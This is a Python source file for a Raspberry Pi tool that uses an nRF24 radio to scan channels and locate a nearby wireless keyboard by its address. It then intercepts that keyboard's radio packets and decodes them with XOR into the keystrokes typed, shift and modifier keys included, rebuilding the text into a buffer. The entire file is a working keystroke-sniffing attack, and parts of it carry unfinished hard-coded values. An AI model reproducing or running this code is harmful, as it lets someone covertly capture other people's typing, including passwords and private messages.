import string

import nrf24
import pigpio
import time

import core.hid_codes as hid_codes
from core.helpers import is_key_event_packet
from core.configurator import NRFConfigurator
from core.limited_array import LimitedArray
from core.nrf_wrapper import NRF24Wrapper
from flask_socketio import SocketIO

class StateMachine:
    def __init__(self, socketio: SocketIO):
        self.socketio = socketio
        self.ipAddress = "localhost"  # ip of raspberry pi
        self.port = "8888"  # port of raspberry pi
        self.pi = None
        self.nrf = None
        self.mac = None
        self.chan = None

        self.state = 'idle'

    def idle_state(self):
        self.state = 'idle'
        print(self.state)

        if self.pi is None or not self.pi.connected:
            while True:
                self.pi = pigpio.pi(self.ipAddress, self.port)
                if self.pi.connected:
                    print("Connected to Raspberry Pi.")
                    self.socketio.emit('message', {'message': "Connected to Raspberry Pi."}, namespace='/')
                    break
                print("Not connected to Raspberry Pi ... retrying.")
                self.socketio.emit('message', {'message': "Not connected to Raspberry Pi ... retrying."}, namespace='/')
                time.sleep(2)  # wait for 2 seconds before retrying

    def listening_state(self):
        self.state = 'listening'
        print(self.state)

        self.nrf = NRFConfigurator.configure_for_mac_cracking(self.pi)
        common_channels = [5, 9, 21, 25, 29, 31, 44, 52, 54, 56, 72, 76]

        while True:
            for chan in common_channels:  # from 2.403 to 2.481
                self.chan = chan
                self.nrf.set_channel(self.chan)
                probed_time = time.time()
                while time.time() - probed_time < 1:
                    payload = self.nrf.get_payload()

                    if payload[4] != 0xcd:
                        continue

                    print(chan, ':'.join(f'{i:02x}' for i in payload))

                    if (payload[6] & 0x7F) << 1 != 0x0A:
                        continue

                    if payload[7] << 1 != 0x38 and payload[7] << 1 != 0x78:
                        continue

                    self.mac = ':'.join(f'{i:02x}' for i in payload[0:5][::-1])

                    self.socketio.emit('message', {'message': f"KEYBOARD with MAC address: {self.mac} FOUND on channel: {self.chan}"}, namespace='/')
                    print("KEYBOARD FOUND!", self.chan, self.mac)
                    
                    return

            common_channels = range(3, 81)
    
    def start_sniffing_state(self):
        self.socketio.start_background_task(self.sniffing_state)

    def sniffing_state(self):
        self.state = 'sniffing'
        print(self.state)

        self.nrf.close_reading_pipe(nrf24.RF24_RX_ADDR.P0)
        buffer = LimitedArray(1024)

        sequence_id_log = LimitedArray(8)
        last_key = None
        key_state = {}

        def gpio_interrupt(gpio, level, tick):
            nonlocal last_key
            nonlocal key_state

            while self.nrf.data_ready():
                payload = self.nrf.get_payload()

                if not is_key_event_packet(payload):
                    # print("not key event packet")
                    continue

                sequence_id = payload[4:6]

                sequence_number = int(
                    "".join(f"{i:02x}" for i in sequence_id[::-1]),
                    base=16
                )

                if sequence_number in sequence_id_log:
                    # print("skipping duplicate sequence_id", sequence_id)
                    continue

                # in final replace 0xCD with first MAC byte
                hid_key = payload[9] ^ 0xCD

                key = f'0x{hid_key:02x}'

                # in final replace 0x52 with MAC value
                hid_knyfel = payload[7] ^ 0x52

                knyfel = f'0x{hid_knyfel:02x}'

                # key_state[hid_key] = sequence_number

                # if hid_key == 0:
                #     key_state = {}
                # print(key_state)

                # if last_key == hid_key:
                # continue

                if hid_key != 0 and f"{payload[10]:x}" == self.mac[3:5]:
                    last_key = hid_key

                    if hid_key == 0x2c:
                        buffer.append(' ')
                    elif hid_key >= 0x04 and hid_key <= 0x1d:
                        if hid_knyfel == 0x20 or hid_knyfel == 0x02:
                            buffer.append(string.ascii_uppercase[last_key - 4])
                        elif hid_knyfel != 0x00:
                            buffer.append(f"<{hid_codes.USB_HID_MODIFIERS_HUMAN[knyfel]} + {string.ascii_lowercase[last_key - 4]}>")
                        else:
                            if sequence_id_log.get_last_item() - sequence_number != 1:
                                buffer.append(string.ascii_lowercase[last_key - 4])
                    elif hid_key >= 0x1e and hid_key <= 0x27:
                        buffer.append(string.digits[(last_key - 29) % 10])
                    else:
                        buffer.append(f"<{hid_codes.USB_HID_KEYS_HUMAN[key]}>")

                    # print(
                    #     sequence_number,
                    #     f'Channel: {chan} | Packet: '
                    #     f'{":".join(hex(x) for x in payload)} | '
                    #     f"HID_KEY: "
                    #     f"{hid_key} | Key: "
                    #     f"{hid_codes.USB_HID_KEYS_HUMAN[key]}"
                    # )

                    sequence_id_log.append(sequence_number)

                    success = self.socketio.emit('message', {'message': "test"}, namespace='/')
                    print(f"Emit successful: {success}")
                    
                    # print(payload)
                    print("".join(buffer))

        self.nrf = NRFConfigurator.configure_for_sniffing(self.pi, self.mac, self.chan, gpio_interrupt)

        while True:
            time.sleep(1)
